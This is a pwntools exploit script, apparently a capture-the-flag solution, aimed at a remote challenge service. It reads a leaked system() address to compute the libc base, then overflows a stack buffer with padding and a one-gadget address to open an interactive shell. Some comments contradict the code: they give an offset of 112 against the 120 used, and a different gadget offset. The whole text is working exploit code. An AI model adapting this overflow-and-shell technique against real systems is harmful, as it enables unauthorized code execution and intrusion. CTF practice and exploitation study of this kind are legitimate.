#!/usr/bin/env python3
from pwn import *

# Set up context and load binaries
context.binary = './chall'
context.log_level = 'debug'

elf = ELF('./chall')
libc = ELF('./libc.so.6')

# Choose target: either run locally or connect remotely
# p = process('./vulnerable')
# p = remote('target.ctf.server', 1337)  # <-- change to the actual target host/port
p = remote("mitt-andra-program.ctfchall.se", 50000, ssl=True)
# p = process("./chall")

# The program prints a line like:
# "Välkommen till mitt andra program! Mitt tur-tal idag är <system addr>. Vad heter du?"
p.recvuntil("r ")
leak_line = p.recvline().strip()
# Parse the leaked system() address (assumes it is printed as a hex pointer followed by a period)
leak = int(leak_line.split(b".")[0], 16)
log.info("Leaked system address: " + hex(leak))

# Calculate libc base using the known offset of system in libc
libc.address = leak - libc.symbols['system']
log.info("Libc base: " + hex(libc.address))

# We now know the address of any libc symbol.
# Instead of building a full ret2libc chain (which would require knowing the address of our buffer in a PIE binary),
# we can use a one gadget that spawns a shell.
# For example, using one gadget at offset 0x4f322 (find one using the 'one_gadget' tool)
one_gadget = libc.address + 0x4c139
log.info("One gadget address: " + hex(one_gadget))

# Determine the offset from the start of the buffer to the return address.
# (This is usually found with cyclic patterns. Here we assume it's 112 bytes.)
offset = 120

# Build the payload: padding followed by our gadget address
payload = flat(
    b"A" * offset,
    p64(one_gadget)
)

print(f"{payload = }")

print(f"{hex(one_gadget) = }")
p.sendline(payload)


p.interactive()
